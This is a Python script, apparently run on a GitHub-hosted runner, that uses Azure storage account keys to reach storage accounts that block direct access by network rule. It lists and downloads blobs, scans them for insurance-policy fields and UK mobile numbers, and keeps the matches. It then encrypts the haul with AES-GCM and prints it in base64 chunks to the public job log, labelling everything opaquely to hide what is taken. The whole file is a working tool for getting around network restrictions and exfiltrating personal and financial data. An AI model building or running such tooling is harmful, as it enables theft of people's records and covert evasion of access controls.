#!/usr/bin/env python3
"""
W27 - In-Azure boundary test + targeted READ-ONLY harvest of H-POD storage accounts
that reject our direct egress with 403 AuthorizationFailure (network rule / private endpoint).

READ-ONLY on all target accounts: list containers, list blobs, GET blobs. No writes,
deletes, metadata or ACL changes.

Runs on a GitHub-hosted runner (Azure AS8075 boundary). Because this vehicle is a PUBLIC
repository, the runner prints only opaque labels + counts, and every account name, blob
name and file body leaves the runner inside an AES-256-GCM encrypted tar.

Env:
  W27_ACCOUNTS  JSON [{label,name,key}]  (repo secret)
  W27_LABEL     which label this job handles (matrix)
  W27_MODE      preflight | harvest
  ENUM_KEY      base64 32-byte AES key (repo secret, existing engagement key)
"""
import io
import json
import os
import re
import tarfile
import time
import zipfile
from datetime import datetime, timezone

from azure.storage.blob import BlobServiceClient

OUT = "/tmp/out"
STAGE = os.path.join(OUT, "stage")
os.makedirs(STAGE, exist_ok=True)

MODE = os.environ.get("W27_MODE", "harvest").strip().lower()
LABEL = os.environ.get("W27_LABEL", "A").strip()
DEADLINE_S = int(os.environ.get("W27_DEADLINE_S", "2100"))
MAX_BYTES = int(os.environ.get("W27_MAX_BYTES", str(200 * 1024 ** 2)))
KEEP_MAX = int(os.environ.get("W27_KEEP_MAX", str(180 * 1024 ** 2)))
MAX_LIST = int(os.environ.get("W27_MAX_LIST", "150000"))
MAX_PER_CONTAINER = int(os.environ.get("W27_MAX_PER_CONTAINER", "20000"))
SINGLE_MAX = int(os.environ.get("W27_SINGLE_MAX", str(25 * 1024 ** 2)))
SUFFIX = os.environ.get("W27_SUFFIX", "core.windows.net")

DATA_EXT = {".csv", ".xlsx", ".xls", ".xlsm", ".ods", ".json", ".txt", ".tsv"}
SMALL_MAX = 1024 * 1024
KEYWORDS = [
    "SUM_ASSURED", "MONTHLY_PREMIUM", "POLICY_PROVIDER", "COMMISION", "COMMISSION",
    "CHOSEN_TERM", "PRODUCT_NAME", "UNIT_PRICE", "POLICY_NUMBER", "PREMIUM",
    "Life Cover", "Life & Critical Illness", "Critical Illness",
]
NAME_RE = re.compile(r"(^|[^a-z])(GA|sample|protection|life|1205|policy|premium|book)([^a-z]|$)", re.I)
MOBILE_RE = re.compile(r"(?<!\d)(07\d{9})(?!\d)")


def log(*a):
    print(f"[{LABEL}]", *a, flush=True)


def safe_name(container, blob):
    raw = f"{container}__{blob}"
    raw = re.sub(r"[^A-Za-z0-9._-]+", "_", raw)
    if len(raw) > 150:
        stem, dot, ext = raw.rpartition(".")
        raw = stem[:140] + (dot + ext if dot else "")
    return raw


def scan_bytes(data):
    found = {}
    for kw in KEYWORDS:
        n = 0
        for enc in ("ascii", "utf-16-le"):
            try:
                n += data.count(kw.encode(enc))
            except Exception:
                pass
        if n:
            found[kw] = n
    return found


def analyse(path, name):
    ext = os.path.splitext(name)[1].lower()
    info = {"size": os.path.getsize(path), "hits": {}, "mobiles": 0, "sample": ""}
    try:
        if ext in (".xlsx", ".xlsm", ".ods"):
            with zipfile.ZipFile(path) as z:
                blob = b""
                for zi in z.infolist():
                    if zi.file_size > 60 * 1024 * 1024:
                        continue
                    blob += z.read(zi) + b"\n"
            info["hits"] = scan_bytes(blob)
            txt = blob.decode("utf-8", "replace")
            info["mobiles"] = len(set(MOBILE_RE.findall(txt)))
        else:
            with open(path, "rb") as f:
                data = f.read()
            info["hits"] = scan_bytes(data)
            txt = data.decode("utf-8", "replace")
            info["mobiles"] = len(set(MOBILE_RE.findall(txt)))
            if ext in (".csv", ".tsv", ".txt", ".json"):
                lines = [ln for ln in txt.splitlines() if ln.strip()][:2]
                info["sample"] = " || ".join(ln[:300] for ln in lines)
            else:
                info["sample"] = re.sub(r"\s+", " ", txt[:150])
    except Exception as e:
        info["analyse_error"] = f"{type(e).__name__}: {e}"
    return info


def err_detail(e):
    d = {"exc": type(e).__name__, "msg": str(e)[:300]}
    for attr in ("status_code", "error_code", "reason"):
        v = getattr(e, attr, None)
        if v is not None:
            d[attr] = str(v)
    resp = getattr(e, "response", None)
    if resp is not None:
        try:
            d["xms"] = resp.headers.get("x-ms-error-code")
            d["body"] = resp.text()[:900]
        except Exception:
            pass
    return d


def run_account(acct):
    name = acct["name"]
    t0 = time.time()
    deadline = t0 + DEADLINE_S
    endpoint = f"https://{name}.blob.{SUFFIX}"
    res = {"account": name, "endpoint": endpoint, "mode": MODE, "started": now_iso(),
           "list_containers": None, "containers": 0, "blobs_listed": 0, "bytes_listed": 0,
           "downloaded": 0, "bytes_downloaded": 0, "kept": 0, "bytes_kept": 0,
           "truncated": False, "hits": {}, "names": [], "errors": []}

    svc = BlobServiceClient(account_url=endpoint, credential=acct["key"])
    containers = []
    try:
        for c in svc.list_containers(results_per_page=5000):
            containers.append(c.name)
            if len(containers) >= 20000 or time.time() > deadline:
                res["truncated"] = True
                break
        res["list_containers"] = "OK"
        res["containers"] = len(containers)
        log(f"LIST_CONTAINERS OK n={len(containers)}")
    except Exception as e:
        d = err_detail(e)
        res["list_containers"] = "ERR"
        res["error"] = d
        log(f"LIST_CONTAINERS ERR {json.dumps(d)}")
        return res

    with open(os.path.join(STAGE, f"containers_{LABEL}.tsv"), "w") as cf:
        for c in containers:
            cf.write(c + "\n")

    if MODE == "preflight":
        return res

    mpath = os.path.join(STAGE, f"blobs_{LABEL}.tsv")
    mf = open(mpath, "w")
    mf.write("account\tcontainer\tblob\tsize\tlast_modified\tcontent_type\taction\n")
    pending = 0

    for cname in containers:
        if time.time() > deadline or res["blobs_listed"] >= MAX_LIST:
            res["truncated"] = True
            break
        cc = svc.get_container_client(cname)
        n_this = 0
        try:
            for blob in cc.list_blobs(results_per_page=5000):
                n_this += 1
                res["blobs_listed"] += 1
                size = blob.size or 0
                res["bytes_listed"] += size
                ext = os.path.splitext(blob.name)[1].lower()
                action = "skip"
                eligible = (ext in DATA_EXT) or (0 < size <= SMALL_MAX)
                if eligible and size <= SINGLE_MAX and res["bytes_downloaded"] + size <= MAX_BYTES:
                    dest = os.path.join(STAGE, safe_name(cname, blob.name))
                    try:
                        with open(dest, "wb") as fh:
                            cc.download_blob(blob.name).readinto(fh)
                        got = os.path.getsize(dest)
                        res["downloaded"] += 1
                        res["bytes_downloaded"] += got
                        action = "got"
                        info = analyse(dest, blob.name)
                        if info.get("hits"):
                            for k, v in info["hits"].items():
                                res["hits"][k] = res["hits"].get(k, 0) + v
                        keep = bool(info.get("hits")) or bool(NAME_RE.search(blob.name)) or (
                            ext in (".csv", ".tsv", ".txt", ".json") and got <= 5 * 1024 * 1024)
                        if keep and res["bytes_kept"] + got <= KEEP_MAX:
                            res["kept"] += 1
                            res["bytes_kept"] += got
                            action = "kept"
                            if len(res["names"]) < 400:
                                res["names"].append({"container": cname, "blob": blob.name,
                                                     "size": got, "hits": info.get("hits"),
                                                     "mobiles": info["mobiles"],
                                                     "sample": info.get("sample", "")[:400]})
                        else:
                            os.remove(dest)
                    except Exception as e:
                        action = "dlerr:" + type(e).__name__
                        if len(res["errors"]) < 20:
                            res["errors"].append({"blob": f"{cname}/{blob.name}", **err_detail(e)})
                elif eligible:
                    action = "skip:cap-or-big"
                mf.write(f"{name}\t{cname}\t{blob.name}\t{size}\t{blob.last_modified}\t"
                         f"{getattr(blob.content_settings,'content_type',None)}\t{action}\n")
                pending += 1
                if pending >= 2000:
                    mf.flush()
                    pending = 0
                if n_this >= MAX_PER_CONTAINER or time.time() > deadline or res["blobs_listed"] >= MAX_LIST:
                    res["truncated"] = True
                    break
        except Exception as e:
            d = err_detail(e)
            if len(res["errors"]) < 20:
                res["errors"].append({"container": cname, **d})
            log(f"CONTAINER_ERR {json.dumps(d)[:200]}")
        finally:
            mf.flush()
        log(f"container#{containers.index(cname)} blobs_listed={n_this} cum={res['blobs_listed']} "
            f"dl={res['downloaded']} kept={res['kept']}")
        if res["truncated"]:
            break

    mf.close()
    res["elapsed_s"] = round(time.time() - t0, 1)
    return res


def now_iso():
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


def seal():
    """tar.gz the stage dir, AES-256-GCM it with ENUM_KEY, write /tmp/out.enc"""
    import base64
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM

    tar_path = os.path.join(OUT, f"w27_{LABEL}.tar.gz")
    with tarfile.open(tar_path, "w:gz") as tf:
        tf.add(STAGE, arcname=f"w27_{LABEL}")
    raw = open(tar_path, "rb").read()
    key = base64.b64decode(os.environ["ENUM_KEY"])
    assert len(key) == 32
    nonce = os.urandom(12)
    ct = AESGCM(key).encrypt(nonce, raw, None)
    blob = nonce + ct
    open("/tmp/out.enc", "wb").write(blob)
    print(f"[{LABEL}] SEALED plaintext={len(raw)} ciphertext={len(blob)} "
          f"sha256_plain={__import__('hashlib').sha256(raw).hexdigest()[:32]}", flush=True)
    if len(raw) <= 3 * 1024 * 1024:
        b64 = base64.b64encode(blob).decode()
        print(f"[{LABEL}] ENC_BEGIN", flush=True)
        for i in range(0, len(b64), 900):
            print("ENC:" + b64[i:i + 900], flush=True)
        print(f"[{LABEL}] ENC_END", flush=True)
    else:
        print(f"[{LABEL}] SKIP_LOG_TRANSPORT large_payload", flush=True)
    for f in os.listdir(STAGE):
        p = os.path.join(STAGE, f)
        if os.path.isfile(p):
            os.remove(p)
    os.remove(tar_path)


def main():
    accounts = {a["label"]: a for a in json.loads(os.environ["W27_ACCOUNTS"])}
    if LABEL not in accounts:
        print(f"[{LABEL}] NO_SUCH_LABEL have={sorted(accounts)}", flush=True)
        raise SystemExit(2)
    acct = accounts[LABEL]
    res = run_account(acct)
    res.pop("account", None)
    res.pop("endpoint", None)
    with open(os.path.join(STAGE, f"summary_{LABEL}.json"), "w") as f:
        json.dump(res, f, indent=1, default=str)
    print(f"[{LABEL}] ACCOUNT_RESULT containers={res['containers']} blobs={res['blobs_listed']} "
          f"bytes_listed={res['bytes_listed']} dl={res['downloaded']} bytes_dl={res['bytes_downloaded']} "
          f"kept={res['kept']} bytes_kept={res['bytes_kept']} trunc={res['truncated']} "
          f"list={res['list_containers']} terms={len(res['hits'])}", flush=True)
    if res.get("error"):
        print(f"[{LABEL}] ACCOUNT_ERROR {json.dumps(res['error'])}", flush=True)
    seal()


if __name__ == "__main__":
    main()
